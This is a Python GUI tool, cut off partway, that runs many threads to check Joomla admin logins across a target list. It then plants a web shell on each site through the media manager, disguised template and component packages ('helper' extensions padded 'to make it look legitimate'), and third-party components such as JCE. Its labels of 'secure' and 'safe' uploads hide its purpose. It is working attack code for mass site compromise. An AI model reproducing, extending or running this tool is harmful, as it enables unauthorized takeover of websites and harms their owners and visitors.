#!/usr/bin/env python3
"""
Advanced Joomla Login Checker and Secure Shell Uploader
Enhanced with secure upload modules and security features
"""

import os
import re
import sys
import time
import random
import requests
import threading
import concurrent.futures
import importlib.util
from string import ascii_lowercase, digits
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import zipfile
import shutil
import base64
import json
import tempfile
import hashlib
import mimetypes

# PyQt5 imports
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar,
                             QComboBox, QCheckBox, QSpinBox, QFileDialog, QTabWidget,
                             QGroupBox, QRadioButton, QMessageBox, QSplitter, QFrame,
                             QTableWidget, QTableWidgetItem, QHeaderView, QTreeWidget,
                             QTreeWidgetItem, QListWidget, QListWidgetItem)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon, QTextCursor
import pyqtgraph as pg
from pyqtgraph import PlotWidget, PlotItem

# Disable Warning https
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Files to store results
LOGIN_SUCCESS = "Joomla_Log_Success.txt"
UPLOAD_SUCCESS = "Joomla_UPs.txt"
FAIL_LOG = "Joomla_failed.txt"

# Thread-safe file operations
file_lock = threading.Lock()

def write_to_file(filename, content):
    with file_lock:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(content)

def random_string(length=8):
    chars = ascii_lowercase + digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_png(width=300, height=150):
    """Generate a random PNG image with cyberpunk theme colors"""
    try:
        from PIL import Image, ImageDraw
        import io
        
        # Create image with cyberpunk colors
        colors = [
            (0, 255, 255),  # Cyan
            (255, 0, 255),  # Magenta
            (0, 0, 255),    # Blue
            (255, 255, 0),  # Yellow
            (0, 255, 0),    # Green
        ]
        
        img = Image.new('RGB', (width, height), color=(0, 0, 0))  # Black background
        draw = ImageDraw.Draw(img)
        
        # Draw random lines and shapes
        for _ in range(20):
            color = random.choice(colors)
            x1, y1 = random.randint(0, width), random.randint(0, height)
            x2, y2 = random.randint(0, width), random.randint(0, height)
            draw.line([(x1, y1), (x2, y2)], fill=color, width=random.randint(1, 3))
        
        for _ in range(10):
            color = random.choice(colors)
            x, y = random.randint(0, width), random.randint(0, height)
            size = random.randint(5, 30)
            draw.rectangle([x, y, x+size, y+size], fill=color, outline=None)
        
        # Save to bytes
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        return img_bytes.getvalue()
    except ImportError:
        # Return a minimal PNG if PIL is not available
        # Simple 1x1 black PNG
        return base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')

# Système de plugins modulaires amélioré
class UploadPlugin:
    def __init__(self, name, description, version):
        self.name = name
        self.description = description
        self.version = version
        self.allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx', 'txt']
        
    def execute(self, session, base_url, headers, shell_content):
        raise NotImplementedError("Plugin must implement execute method")
    
    def validate_file_extension(self, filename):
        """Validate file extension against allowed list"""
        ext = filename.split('.')[-1].lower()
        return ext in self.allowed_extensions
    
    def generate_safe_filename(self, original_name):
        """Generate a safe filename with allowed extension"""
        name, ext = os.path.splitext(original_name)
        if not self.validate_file_extension(original_name):
            # If extension is not allowed, use a safe one
            ext = '.txt'
        safe_name = f"{name}_{random_string(8)}{ext}"
        return safe_name

class SecureMediaManagerPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("Secure Media Manager", "Secure upload via Joomla Media Manager", "2.0")
        self.allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt']
        
    def execute(self, session, base_url, headers, shell_content):
        try:
            # Get media manager page
            media_url = f"{base_url}/administrator/index.php?option=com_media"
            media_page = session.get(
                media_url,
                headers=headers,
                verify=False,
                timeout=10
            )
            
            if media_page.status_code != 200:
                return None
                
            # Look for token with improved regex
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, media_page.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                return None
                
            # Create temporary file with safe extension
            safe_filename = self.generate_safe_filename("config.txt")
            temp_dir = tempfile.gettempdir()
            tmp_file = os.path.join(temp_dir, safe_filename)
            
            try:
                with open(tmp_file, "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Get correct MIME type
                mime_type, _ = mimetypes.guess_type(tmp_file)
                if not mime_type:
                    mime_type = 'text/plain'
                
                # Upload file with safe extension
                files = {
                    'Filedata': (safe_filename, open(tmp_file, 'rb'), mime_type),
                    token_name: (None, '1'),
                    'task': (None, 'file.upload'),
                    'return': (None, ''),
                    'folder': (None, '')
                }
                
                upload_url = f"{base_url}/administrator/index.php?option=com_media&task=file.upload"
                upload_response = session.post(
                    upload_url,
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=20
                )
                
                # Check response
                if upload_response.status_code == 200:
                    if 'success' in upload_response.text.lower():
                        shell_url = f"{base_url}/images/{safe_filename}"
                        return shell_url
                        
                    # Try JSON response
                    try:
                        response_json = upload_response.json()
                        if response_json.get('success'):
                            shell_url = f"{base_url}/images/{safe_filename}"
                            return shell_url
                    except:
                        pass
                        
                return None
                
            finally:
                # Clean up temp file
                if os.path.exists(tmp_file):
                    os.remove(tmp_file)
                    
        except Exception as e:
            print(f"Media Manager error: {str(e)}")
            return None

class SecureTemplatePlugin(UploadPlugin):
    def __init__(self):
        super().__init__("Secure Template", "Secure upload via template installation", "2.0")
        
    def execute(self, session, base_url, headers, shell_content):
        try:
            # Create unique template name
            name = "tpl_helper_" + random_string(5)
            temp_dir = tempfile.mkdtemp()
            template_dir = os.path.join(temp_dir, name)
            
            try:
                # Create template directory structure
                os.makedirs(os.path.join(template_dir, "html"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "language"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "css"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "js"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "images"), exist_ok=True)
                
                # Create template manifest
                manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<extension version="3.0" type="template" client="site">
    <name>{name}</name>
    <creationDate>2023</creationDate>
    <author>Joomla Helper Team</author>
    <authorEmail>contact@example.com</authorEmail>
    <authorUrl>https://www.example.com</authorUrl>
    <copyright>Copyright (C) 2023. All rights reserved.</copyright>
    <license>GNU General Public License version 2 or later</license>
    <version>1.0.0</version>
    <description>Helper template for Joomla sites</description>
    
    <files>
        <filename>index.php</filename>
        <filename>templateDetails.xml</filename>
        <filename>template_preview.png</filename>
        <filename>template_thumbnail.png</filename>
    </files>
    
    <positions>
        <position>position-1</position>
        <position>position-2</position>
        <position>position-3</position>
    </positions>
</extension>"""
                
                with open(os.path.join(template_dir, "templateDetails.xml"), "w", encoding="utf-8") as f:
                    f.write(manifest_content)
                
                # Create index.php
                index_content = """<?php
defined('_JEXEC') or die;

$app = JFactory::getApplication();
$doc = JFactory::getDocument();

$doc->addStyleSheet('templates/<?php echo $this->template ?>/css/template.css');

?>
<!DOCTYPE html>
<html lang="<?php echo $this->language; ?>">
<head>
    <jdoc:include type="head" />
</head>
<body>
    <div class="container">
        <header>
            <jdoc:include type="modules" name="position-1" style="none" />
        </header>
        <main>
            <jdoc:include type="modules" name="position-2" style="none" />
            <jdoc:include type="component" />
        </main>
        <footer>
            <jdoc:include type="modules" name="position-3" style="none" />
        </footer>
    </div>
</body>
</html>"""
                
                with open(os.path.join(template_dir, "index.php"), "w", encoding="utf-8") as f:
                    f.write(index_content)
                
                # Create shell file with safe extension
                safe_filename = self.generate_safe_filename("config.txt")
                with open(os.path.join(template_dir, safe_filename), "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Generate random PNG images
                preview_png = generate_random_png(300, 150)
                thumbnail_png = generate_random_png(150, 75)
                
                with open(os.path.join(template_dir, "template_preview.png"), "wb") as f:
                    f.write(preview_png)
                
                with open(os.path.join(template_dir, "template_thumbnail.png"), "wb") as f:
                    f.write(thumbnail_png)
                
                # Create zip file
                zip_filename = f"{name}.zip"
                with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(template_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, template_dir)
                            zipf.write(file_path, arcname)
                
                # Get template installation page
                install_page = session.get(
                    f"{base_url}/administrator/index.php?option=com_installer&view=install",
                    headers=headers,
                    verify=False,
                    timeout=20
                )
                
                # Find token with improved regex
                token_patterns = [
                    r'name="([a-f0-9]{32})" value="1"',
                    r'name="(\w+)" value="1"',
                    r'<input type="hidden" name="([^"]+)" value="1"'
                ]
                
                token_name = None
                for pattern in token_patterns:
                    token_match = re.search(pattern, install_page.text)
                    if token_match:
                        token_name = token_match.group(1)
                        break
                
                if token_name:
                    # Upload template
                    files = {
                        'install_package': (f"{name}.zip", open(f"{name}.zip", 'rb'), 'application/zip'),
                        'installtype': (None, 'upload'),
                        token_name: (None, '1'),
                        'task': (None, 'install.install')
                    }
                    
                    upload_result = session.post(
                        f"{base_url}/administrator/index.php?option=com_installer&task=install.install",
                        headers=headers,
                        files=files,
                        verify=False,
                        timeout=30
                    )
                    
                    shell_url = f"{base_url}/templates/{name}/{safe_filename}"
                    
                    if upload_result.status_code == 200 and ("success" in upload_result.text.lower() or "install" in upload_result.text.lower()):
                        return shell_url
                
                return None
                
            finally:
                # Clean up temporary files
                if os.path.exists(zip_filename):
                    os.remove(zip_filename)
                shutil.rmtree(temp_dir)
                    
        except Exception as e:
            print(f"Template upload error: {str(e)}")
            return None

class ARIImageSliderPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("ARI Image Slider", "Upload via ARI Image Slider component", "1.0")
        self.allowed_extensions = ['jpg', 'jpeg', 'png', 'gif']
        
    def execute(self, session, base_url, headers, shell_content):
        """Tentative d'upload via le module ARI Image Slider"""
        try:
            # Vérifier si le composant ARI Image Slider est installé
            ari_check = session.get(
                f"{base_url}/administrator/index.php?option=com_ariimageslider",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            if ari_check.status_code != 200:
                return None
                
            # Rechercher le token CSRF avec regex améliorée
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, ari_check.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                return None
                
            # Créer un fichier temporaire avec une extension sécurisée
            safe_filename = self.generate_safe_filename("image_config.txt")
            temp_dir = tempfile.gettempdir()
            tmp_file = os.path.join(temp_dir, safe_filename)
            
            try:
                with open(tmp_file, "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Tenter l'upload via le composant ARI
                files = {
                    'image_file': (safe_filename, open(tmp_file, 'rb'), 'text/plain'),
                    token_name: (None, '1'),
                    'task': (None, 'image.upload'),
                    'option': (None, 'com_ariimageslider')
                }
                
                upload_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_ariimageslider&task=image.upload",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=20
                )
                
                # Vérifier la réponse
                if upload_response.status_code == 200 and "success" in upload_response.text.lower():
                    shell_url = f"{base_url}/images/ariimageslider/{safe_filename}"
                    return shell_url
                    
                return None
                
            finally:
                # Nettoyer le fichier temporaire
                if os.path.exists(tmp_file):
                    os.remove(tmp_file)
                    
        except Exception as e:
            print(f"ARI Image Slider error: {str(e)}")
            return None

class SimpleFileUploadPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("Simple File Upload", "Upload via Simple File Upload module", "1.0")
        self.allowed_extensions = ['txt', 'pdf', 'doc', 'docx']
        
    def execute(self, session, base_url, headers, shell_content):
        """Tentative d'upload via le module Simple File Upload"""
        try:
            # Vérifier si le module Simple File Upload est accessible
            mod_check = session.get(
                f"{base_url}/index.php?option=com_ajax&module=simplefileupload",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            if mod_check.status_code != 200:
                return None
                
            # Créer un fichier temporaire avec une extension sécurisée
            safe_filename = self.generate_safe_filename("document.txt")
            temp_dir = tempfile.gettempdir()
            tmp_file = os.path.join(temp_dir, safe_filename)
            
            try:
                with open(tmp_file, "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Tenter l'upload via le module
                files = {
                    'file': (safe_filename, open(tmp_file, 'rb'), 'text/plain'),
                    'module': (None, 'simplefileupload'),
                    'option': (None, 'com_ajax')
                }
                
                upload_response = session.post(
                    f"{base_url}/index.php?option=com_ajax&module=simplefileupload",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=20
                )
                
                # Vérifier la réponse
                if upload_response.status_code == 200:
                    try:
                        response_json = upload_response.json()
                        if 'success' in response_json and response_json['success']:
                            shell_url = f"{base_url}/images/{safe_filename}"
                            return shell_url
                    except:
                        if "success" in upload_response.text.lower():
                            shell_url = f"{base_url}/images/{safe_filename}"
                            return shell_url
                            
                return None
                
            finally:
                # Nettoyer le fichier temporaire
                if os.path.exists(tmp_file):
                    os.remove(tmp_file)
                    
        except Exception as e:
            print(f"Simple File Upload error: {str(e)}")
            return None

class JCEInstallerPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("JCE Installer", "Upload via JCE Installer component", "1.0")
        self.allowed_extensions = ['zip', 'txt', 'xml']
        
    def execute(self, session, base_url, headers, shell_content):
        """Tentative d'upload via JCE Installer"""
        try:
            # Vérifier si JCE Installer est accessible
            jce_check = session.get(
                f"{base_url}/administrator/index.php?option=com_jce&view=installer",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            if jce_check.status_code != 200:
                return None
                
            # Rechercher le token CSRF avec regex améliorée
            token_patterns = [
                r'name="([a-f0-9]{32})" value="1"',
                r'name="(\w+)" value="1"',
                r'<input type="hidden" name="([^"]+)" value="1"'
            ]
            
            token_name = None
            for pattern in token_patterns:
                token_match = re.search(pattern, jce_check.text)
                if token_match:
                    token_name = token_match.group(1)
                    break
            
            if not token_name:
                return None
            
            # Créer un fichier ZIP avec le shell
            zip_name = f"package_{random_string(8)}.zip"
            temp_dir = tempfile.mkdtemp()
            
            try:
                manifest_content = """<?xml version="1.0" encoding="utf-8"?>
<extension type="file" version="3.0" method="upgrade">
    <name>File Manager Helper</name>
    <version>1.0.0</version>
    <description>Helper extension for file management</description>
    <files>
        <filename>helper.txt</filename>
    </files>
</extension>"""
                
                helper_filename = f"helper_{random_string(8)}.txt"
                helper_path = os.path.join(temp_dir, helper_filename)
                manifest_path = os.path.join(temp_dir, "manifest.xml")
                
                with open(helper_path, "w", encoding="utf-8") as f:
                    f.write(shell_content)
                with open(manifest_path, "w", encoding="utf-8") as f:
                    f.write(manifest_content)
                
                # Create zip file
                with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(helper_path, helper_filename)
                    zipf.write(manifest_path, "manifest.xml")
                
                # Tenter l'upload via JCE Installer
                files = {
                    'install_package': (zip_name, open(zip_name, 'rb'), 'application/zip'),
                    token_name: (None, '1'),
                    'installtype': (None, 'upload'),
                    'task': (None, 'install.install')
                }
                
                upload_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_jce&view=installer&task=install.install",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=30
                )
                
                # Vérifier la réponse
                if upload_response.status_code == 200 and ("success" in upload_response.text.lower() or "install" in upload_response.text.lower()):
                    shell_url = f"{base_url}/tmp/{helper_filename}"
                    return shell_url
                    
                return None
                
            finally:
                # Nettoyer les fichiers temporaires
                if os.path.exists(zip_name):
                    os.remove(zip_name)
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            print(f"JCE Installer error: {str(e)}")
            return None

class AutoUploadPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("Auto Upload", "Try all available upload methods automatically", "2.0")
        self.allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt', 'zip']
        self.update_signal = None  # Will be set by worker thread
        
    def execute(self, session, base_url, headers, shell_content):
        """Essaye toutes les méthodes d'upload disponibles automatiquement"""
        methods = [
            SecureMediaManagerPlugin(),
            SecureTemplatePlugin(),
            ARIImageSliderPlugin(),
            SimpleFileUploadPlugin(),
            JCEInstallerPlugin()
        ]
        
        for method in methods:
            try:
                if self.update_signal:
                    self.update_signal.emit(f"Trying {method.name}...", "info")
                result = method.execute(session, base_url, headers, shell_content)
                if result:
                    if self.update_signal:
                        self.update_signal.emit(f"Success with {method.name}: {result}", "success")
                    return result
            except Exception as e:
                if self.update_signal:
                    self.update_signal.emit(f"Error with {method.name}: {str(e)}", "error")
                continue
        
        return None

class WorkerThread(QThread):
    update_signal = pyqtSignal(str, str)
    progress_signal = pyqtSignal(int, int)
    result_signal = pyqtSignal(str, str, str)
    finished_signal = pyqtSignal()
    
    def __init__(self, targets, user_agents, upload_method, use_custom_shell, shell_content, threads):
        super().__init__()
        self.targets = targets
        self.user_agents = user_agents
        self.upload_method = upload_method
        self.use_custom_shell = use_custom_shell
        self.shell_content = shell_content
        self.threads = threads
        self.is_running = True
        self.component_name = ""
        self.plugins = self.load_plugins()
        
    def run(self):
        try:
            total = len(self.targets)
            
            # Create shell packages based on chosen method
            if self.upload_method == "Component" or self.upload_method == "FileManager":
                self.component_name = self.create_component_zip()
                if not self.component_name:
                    self.update_signal.emit("Failed to create shell component", "error")
                    self.finished_signal.emit()
                    return
            
            # Process targets
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for i, target in enumerate(self.targets):
                    if not self.is_running:
                        break
                    futures.append(executor.submit(self.process_target, target, i, total))
                    time.sleep(0.1)  # Small delay to avoid overwhelming the UI
                
                # Wait for all tasks to complete or cancel
                for future in concurrent.futures.as_completed(futures):
                    if not self.is_running:
                        executor.shutdown(wait=False)
                        break
                    try:
                        future.result()
                    except Exception as e:
                        self.update_signal.emit(f"Thread error: {str(e)}", "error")
            
            # Show summary if not cancelled
            if self.is_running:
                try:
                    login_success = sum(1 for _ in open(LOGIN_SUCCESS, encoding="utf-8"))
                    upload_success = sum(1 for _ in open(UPLOAD_SUCCESS, encoding="utf-8"))
                    failed = sum(1 for _ in open(FAIL_LOG, encoding="utf-8"))
                    
                    self.update_signal.emit("\nSummary:", "info")
                    self.update_signal.emit(f"Login Success: {login_success}", "success")
                    self.update_signal.emit(f"Upload Success: {upload_success}", "success")
                    self.update_signal.emit(f"Failed: {failed}", "error")
                except:
                    pass
        except Exception as e:
            self.update_signal.emit(f"Process error: {str(e)}", "error")
        finally:
            # Clean up
            try:
                if self.component_name and os.path.exists(f"{self.component_name}.zip"):
                    os.remove(f"{self.component_name}.zip")
            except:
                pass
            
            self.finished_signal.emit()
    
    def stop(self):
        self.is_running = False
    
    def load_plugins(self):
        """Charge tous les plugins disponibles"""
        plugins = []
        plugins_dir = "plugins"
        
        if not os.path.exists(plugins_dir):
            os.makedirs(plugins_dir)
            # Create default plugins
            self.create_default_plugins(plugins_dir)
        
        for file in os.listdir(plugins_dir):
            if file.endswith(".py") and file != "__init__.py":
                plugin_name = file[:-3]
                try:
                    spec = importlib.util.spec_from_file_location(plugin_name, os.path.join(plugins_dir, file))
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    if hasattr(module, 'register_plugin'):
                        plugins.extend(module.register_plugin())
                except Exception as e:
                    self.update_signal.emit(f"Failed to load plugin {plugin_name}: {str(e)}", "error")
        
        # Ajouter les nouveaux plugins
        plugins.extend([
            SecureMediaManagerPlugin(),
            SecureTemplatePlugin(),
            ARIImageSliderPlugin(),
            SimpleFileUploadPlugin(),
            JCEInstallerPlugin(),
            AutoUploadPlugin()
        ])
        
        # Set update_signal for AutoUploadPlugin
        for plugin in plugins:
            if isinstance(plugin, AutoUploadPlugin):
                plugin.update_signal = self.update_signal
        
        return plugins
    
    def create_default_plugins(self, plugins_dir):
        """Create default plugins if none exist"""
        # Media Manager plugin
        media_plugin_content = '''
from worker import UploadPlugin

class MediaManagerPlugin(UploadPlugin):
    def __init__(self):
        super().__init__("Media Manager", "Upload via Joomla Media Manager", "1.0")
        
    def execute(self, session, base_url, headers, shell_content):
        try:
            # Get media manager page
            import re
            media_page = session.get(
                f"{base_url}/administrator/index.php?option=com_media",
                headers=headers,
                verify=False,
                timeout=10
            )
            
            # Look for token
            token_match = re.search(r'name="([a-f0-9]{32})" value="1"', media_page.text)
            if token_match:
                token_name = token_match.group(1)
                
                # Create temporary file with shell content
                import tempfile
                import os
                from worker import random_string
                
                tmp_file = f"shell_{random_string(8)}.php"
                with open(tmp_file, "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Upload file
                files = {
                    'Filedata': (tmp_file, open(tmp_file, 'rb'), 'application/x-php'),
                    token_name: (None, '1'),
                    'task': (None, 'file.upload'),
                    'return': (None, ''),
                    'folder': (None, '')
                }
                
                upload_response = session.post(
                    f"{base_url}/administrator/index.php?option=com_media&task=file.upload",
                    headers=headers,
                    files=files,
                    verify=False,
                    timeout=20
                )
                
                # Clean up temp file
                os.remove(tmp_file)
                
                try:
                    # Joomla media manager returns JSON response
                    upload_json = upload_response.json()
                    if 'success' in upload_json and upload_json['success']:
                        shell_url = f"{base_url}/images/{tmp_file}"
                        return shell_url
                except:
                    # If not JSON, check for success in HTML
                    if "success" in upload_response.text.lower():
                        shell_url = f"{base_url}/images/{tmp_file}"
                        return shell_url
            return None
        except Exception as e:
            return None

def register_plugin():
    return [MediaManagerPlugin()]
'''
        
        with open(os.path.join(plugins_dir, "media_manager.py"), "w", encoding="utf-8") as f:
            f.write(media_plugin_content)

    def detect_joomla_version(self, session, base_url, headers):
        """Détecte la version de Joomla pour adapter les techniques d'exploitation"""
        version_patterns = {
            r'Joomla! (\d+\.\d+\.\d+)': "standard",
            r"version.*?(\d+\.\d+\.\d+)": "standard",
            r"Joomla.*?(\d+\.\d+)": "standard"
        }
        
        check_paths = [
            "/administrator/manifests/files/joomla.xml",
            "/language/en-GB/en-GB.xml",
            "/README.txt",
            "/administrator/components/com_content/content.xml"
        ]
        
        for path in check_paths:
            try:
                response = session.get(f"{base_url}{path}", headers=headers, timeout=10, verify=False)
                for pattern, vtype in version_patterns.items():
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        return match.group(1)
            except:
                continue
        
        return "unknown"

    def get_exploit_methods_for_version(self, version):
        """Retourne les méthodes d'exploitation appropriées pour la version détectée"""
        if version == "unknown":
            return ["Component", "Template", "FileManager", "Media Manager", "JCE Installer", "ARI Image Slider", "Simple File Upload", "Auto Upload"]
        
        try:
            major_version = float(version.split('.')[0])
            
            if major_version >= 4.0:
                return ["Media Manager", "JCE Installer", "Auto Upload", "Template Editor", "AJAX", "Config"]
            elif major_version >= 3.0:
                return ["Component", "Template", "FileManager", "Media Manager", "JCE Installer", "ARI Image Slider", "Simple File Upload", "Auto Upload"]
            else:
                return ["Component", "Template", "FileManager", "Auto Upload"]
        except:
            return ["Component", "Template", "FileManager", "Media Manager", "JCE Installer", "ARI Image Slider", "Simple File Upload", "Auto Upload"]
    
    def create_component_zip(self):
        """Create a Joomla component with the shell.php file"""
        try:
            # Create unique name
            name = "com_helper_" + random_string(5)
            temp_dir = tempfile.mkdtemp()
            component_dir = os.path.join(temp_dir, name)
            
            try:
                # Create component directory structure
                os.makedirs(os.path.join(component_dir, "admin"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "site"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "admin/controllers"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "admin/models"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "admin/views"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "admin/tables"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "admin/helpers"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "site/controllers"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "site/models"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "site/views"), exist_ok=True)
                os.makedirs(os.path.join(component_dir, "site/helpers"), exist_ok=True)
                
                # Create component manifest
                manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.0" method="upgrade">
    <name>{name}</name>
    <creationDate>2023</creationDate>
    <author>Joomla Helper Team</author>
    <authorEmail>contact@example.com</authorEmail>
    <authorUrl>https://www.example.com</authorUrl>
    <copyright>Copyright (C) 2023. All rights reserved.</copyright>
    <license>GNU General Public License version 2 or later</license>
    <version>1.0.0</version>
    <description>Helper component for Joomla administration</description>
    
    <files folder="admin">
        <filename>controller.php</filename>
        <filename>{name}.php</filename>
        <filename>access.xml</filename>
        <filename>config.xml</filename>
    </files>
    
    <administration>
        <menu>Helper Tool</menu>
        <files folder="admin">
            <filename>controller.php</filename>
            <filename>{name}.php</filename>
        </files>
    </administration>
</extension>"""
                
                with open(os.path.join(component_dir, f"{name}.xml"), "w", encoding="utf-8") as f:
                    f.write(manifest_content)
                
                # Create main component file
                main_content = """<?php
defined('_JEXEC') or die('Restricted access');

class HelperComponentHelper
{
    public static function getHelper()
    {
        return 'Helper loaded';
    }
}
?>"""
                
                with open(os.path.join(component_dir, "admin", f"{name}.php"), "w", encoding="utf-8") as f:
                    f.write(main_content)
                
                # Create controller
                controller_content = """<?php
defined('_JEXEC') or die('Restricted access');

class HelperComponentController extends JControllerLegacy
{
    public function display($cachable = false, $urlparams = array())
    {
        parent::display($cachable, $urlparams);
        return $this;
    }
}
?>"""
                
                with open(os.path.join(component_dir, "admin/controller.php"), "w", encoding="utf-8") as f:
                    f.write(controller_content)
                
                # Create shell file
                if self.use_custom_shell:
                    shell_content = self.shell_content
                else:
                    shell_content = self.get_default_shell()
                
                with open(os.path.join(component_dir, "admin/shell.php"), "w", encoding="utf-8") as f:
                    f.write(shell_content)
                
                # Create additional files to make it look legitimate
                with open(os.path.join(component_dir, "admin/access.xml"), "w", encoding="utf-8") as f:
                    f.write("""<?xml version="1.0" encoding="utf-8"?>
<access component="com_helper">
    <section name="component">
        <action name="core.admin" title="JACTION_ADMIN" description="JACTION_ADMIN_COMPONENT_DESC" />
        <action name="core.manage" title="JACTION_MANAGE" description="JACTION_MANAGE_COMPONENT_DESC" />
        <action name="core.create" title="JACTION_CREATE" description="JACTION_CREATE_COMPONENT_DESC" />
        <action name="core.delete" title="JACTION_DELETE" description="JACTION_DELETE_COMPONENT_DESC" />
        <action name="core.edit" title="JACTION_EDIT" description="JACTION_EDIT_COMPONENT_DESC" />
        <action name="core.edit.state" title="JACTION_EDITSTATE" description="JACTION_EDITSTATE_COMPONENT_DESC" />
    </section>
</access>""")
                
                with open(os.path.join(component_dir, "admin/config.xml"), "w", encoding="utf-8") as f:
                    f.write("""<?xml version="1.0" encoding="utf-8"?>
<config>
    <fieldset name="basic">
        <field name="param1" type="text" default="" label="Parameter 1" description="" />
        <field name="param2" type="text" default="" label="Parameter 2" description="" />
    </fieldset>
</config>""")
                
                # Create zip file
                zip_filename = f"{name}.zip"
                with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, dirs, files in os.walk(component_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, component_dir)
                            zipf.write(file_path, arcname)
                
                self.update_signal.emit(f"Component created: {zip_filename}", "info")
                return name
                
            finally:
                # Clean up temporary directory
                shutil.rmtree(temp_dir)
                
        except Exception as e:
            self.update_signal.emit(f"Error creating component ZIP: {str(e)}", "error")
            return None

    def create_template_zip(self):
        """Create a Joomla template with the shell.php file"""
        try:
            # Create unique name
            name = "tpl_helper_" + random_string(5)
            temp_dir = tempfile.mkdtemp()
            template_dir = os.path.join(temp_dir, name)
            
            try:
                # Create template directory structure
                os.makedirs(os.path.join(template_dir, "html"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "language"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "css"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "js"), exist_ok=True)
                os.makedirs(os.path.join(template_dir, "images"), exist_ok=True)
                
                # Create template manifest
                manifest_content = f"""<?xml version="1.0" encoding="utf-8"?>
<extension version="3.0" type="template" client="site">
    <name>{name}</name>
    <creationDate>2023</creationDate>
    <author>Joomla Helper Team</author>
    <authorEmail>contact@example.com</authorEmail>
    <authorUrl>https://www.example.com</authorUrl>
    <copyright>Copyright (C) 2023. All rights reserved.</copyright>
    <license>GNU General Public License version 2 or later</license>
    <version>1.0.0</version>
    <description>Helper template for Joomla sites</description>
    
    <files>
        <filename>index.php</filename>
        <filename>templateDetails.xml</filename>
        <filename>template_preview.png</filename>
        <filename>template_thumbnail.png</filename>
    </files>
    
    <positions>
        <position>position-1</position>
        <position>position-2</position>
        <position>position-3</position>
    </positions>
</extension>"""
                
                with open(os.path.join(template_dir, "templateDetails.xml"), "w", encoding="utf-8") as f:
                    f.write(manifest_content)
                
                # Create index.php
                index_content = """<?php
defined('_JEXEC') or die;

$app = JFactory::getApplication();
$doc = JFactory::getDocument();

$doc->addStyleSheet('templates/<?php echo $this->template ?>/css/template.css');

?>
<!DOCTYPE html>
<html lang="<?php echo $this->language; ?>">
<head>
    <jdoc:include type="head" />
</head>
<body>
    <div class="container">
        <header>
            <jdoc:include type="modules" name="position-1" style="none" />
        </header>
        <main>
